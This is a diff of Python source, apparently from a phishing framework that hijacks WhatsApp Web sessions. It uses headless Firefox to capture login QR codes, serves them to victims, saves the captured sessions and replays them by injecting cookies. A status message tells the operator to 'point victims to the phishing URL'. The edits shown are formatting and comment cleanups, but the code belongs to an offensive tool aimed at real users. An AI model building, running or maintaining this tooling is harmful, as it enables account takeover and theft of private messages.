@@ -91,13 +91,16 @@ def build_firefox_options(useragent="(default)", headless=True, binary_path=None
 
     Args:
         useragent:    (default), (random), or a custom UA string.
-        headless:     True for background grabber sessions; False for visible session replay.
-        binary_path:  Explicit Firefox binary path. Attached to opts.binary_location so
-                      custom/snap/macOS installs are used even when not in PATH.
+        headless:     True for background grabber sessions.
+                      False for visible session replay.
+        binary_path:  Explicit Firefox binary path. Attached to
+                      opts.binary_location so custom/snap/macOS installs are used
+                      even when not in PATH.
     """
     opts = Options()
 
-    # Attach resolved Firefox binary so non-PATH installs (snap, macOS, custom) work correctly
+    # Attach resolved Firefox binary so non-PATH installs work correctly.
+    # This includes snap, macOS, custom installs, and non-PATH Firefox.
     if binary_path and os.path.exists(binary_path):
         opts.binary_location = binary_path
 
@@ -170,11 +173,11 @@ def Run_inside_thread(thread_name):
 
 
 class headless_browsers:
-    # Here we create invisible browsers, fast and in an organized way without repeating browsers for the same module
+    # Here we create invisible browsers in an organized way
+    # without repeating browsers for the same module
     def __init__(self):
-        self.browsers = (
-            {}
-        )  # Here we save all the browsers we create so we can control and use later
+        self.browsers = {}
+        # Here we save all the browsers we create so we can control and use later
         self.useragent = ""
         self.browser_path = resolve_firefox_binary()
         self.geckodriver_path = resolve_geckodriver_path()
@@ -229,11 +232,13 @@ class headless_browsers:
                 traceback.print_exc()
             else:
                 error(
-                    "Failed to initialize Firefox browser. Check debug mode for details."
+                    "Failed to initialize Firefox browser. "
+                    "Check debug mode for details."
                 )
             return {"Status": "Failed"}
 
-        # Register browser before navigating so any concurrent duplicate check blocks correctly
+        # Register browser before navigating so any concurrent duplicate
+        # check blocks correctly.
         new_headless[module_name]["Status"] = "Success"
         self.browsers.update(new_headless)
 
@@ -306,7 +311,7 @@ class headless_browsers:
                             except Exception as exc:
                                 # XPath not found - expected during active session wait
                                 if Settings.debug and isinstance(exc, Exception):
-                                    pass  # Log would be too verbose; these are normal timeouts
+                                    pass  # These are normal timeouts
                                 continue
                         if identifier:
                             # If the identifier is found the attack has
@@ -328,7 +333,8 @@ class headless_browsers:
 
                             if Settings.verbose:
                                 status(
-                                    "Resetting browser cookies and localStorage to start over.."
+                                    "Resetting browser cookies and localStorage "
+                                    "to start over.."
                                 )
 
                             # Reset for localstorage / cookie session types
@@ -344,7 +350,9 @@ class headless_browsers:
                                 ConnectionAbortedError,
                                 BrokenPipeError,
                             ):
-                                pass  # Browser has closed; listener thread will detect and exit
+                                # Browser has closed; listener thread will detect
+                                # and exit
+                                pass
                             except Exception as reset_err:
                                 if Settings.debug:
                                     status(f"Session reset warning: {reset_err}")
@@ -436,7 +444,8 @@ class headless_browsers:
 
         if not winning_xpath:
             error(
-                f"QR element not found after waiting [{module_name}] - XPaths may be stale"
+                f"QR element not found after waiting [{module_name}] - "
+                "XPaths may be stale"
             )
             if Settings.debug:
                 status(f"Tried XPaths: {xpaths}")
@@ -491,7 +500,8 @@ class headless_browsers:
         pass all four reload-button selectors it defines.
         """
         status(
-            f"Running a thread to detect Idle once it happens then click the QR reload button [{module_name}]"
+            "Running a thread to detect Idle once it happens then "
+            f"click the QR reload button [{module_name}]"
         )
         controller = self.browsers[module_name]["Controller"]
         if not controller:
@@ -545,7 +555,8 @@ class headless_browsers:
             error(f"Webserver failed to start [{module_name}]: {str(e)}")
             if port < 1024:
                 error(
-                    "Ports below 1024 require root privileges. Try a port >= 1024 (e.g. 8080)."
+                    "Ports below 1024 require root privileges. Try a port >= "
+                    "1024 (e.g. 8080)."
                 )
             # Clean up browser so all other threads (QR updater, idle detector,
             # session listener) also exit — otherwise they keep running with no server.
@@ -577,8 +588,10 @@ class headless_browsers:
                 return  # module was stopped before QR appeared
             # Print a progress dot every 10 s so the user sees it's still working
             if time.time() - last_dot >= 10:
+                remaining = int(deadline - time.time())
                 status(
-                    f"Still waiting for QR... ({int(deadline - time.time())}s remaining) [{module_name}]"
+                    f"Still waiting for QR... ({remaining}s remaining) "
+                    f"[{module_name}]"
                 )
                 last_dot = time.time()
             time.sleep(0.5)
@@ -587,17 +600,20 @@ class headless_browsers:
             error(f"QR image not generated after 150s [{module_name}]")
             error("Possible causes:")
             error(
-                "  1. WhatsApp Web changed its DOM – run with debug mode to see which XPaths were tried"
+                "  1. WhatsApp Web changed its DOM – run with debug mode to see which "
+                "XPaths were tried"
             )
             error(
-                "  2. Slow network – the headless browser couldn't load web.whatsapp.com in time"
+                "  2. Slow network – the headless browser couldn't load "
+                "web.whatsapp.com in time"
             )
             error("  3. Firefox headless issue – try restarting the framework")
             if Settings.debug:
                 status(f"QR image expected at: {tmp_png}")
         else:
             status(
-                f"QR image available [{module_name}] - point victims to the phishing URL"
+                f"QR image available [{module_name}] - point victims to "
+                "the phishing URL"
             )
 
         while self.browsers[module_name]["Status"] == "Success":
@@ -850,9 +866,9 @@ class headless_browsers:
         status(f"Session {session_id} saved successfully: {profile_dir_path}")
 
     def close_all(self):
-        if (
-            self.browsers != {}
-        ):  # I'm using this comparsion because it's is faster than comparsion with keys length btw
+        if self.browsers != {}:
+            # I'm using this comparison because it is faster than comparison with
+            # keys length btw
             for module_name in list(self.browsers.keys()):
                 try:
                     self.browsers[module_name][
@@ -1177,7 +1193,9 @@ class visible_browsers:
                     except Exception as cookie_err:
                         if Settings.debug:
                             status(
-                                f"Warning: Could not add cookie '{cookie.get('name', 'unknown')}': {str(cookie_err)}"
+                                "Warning: Could not add cookie "
+                                f"'{cookie.get('name', 'unknown')}': "
+                                f"{str(cookie_err)}"
                             )
             except Exception as e:
                 error(f"Failed to inject cookies: {str(e)}")
@@ -1313,7 +1331,8 @@ class visible_browsers:
             except Exception as e:
                 if "Firefox" in str(e):
                     error(
-                        "Firefox failed to start. Check your installation and permissions."
+                        "Firefox failed to start. Check your installation "
+                        "and permissions."
                     )
                 elif "geckodriver" in str(e):
                     error("Geckodriver not found. Check your Selenium Manager setup.")
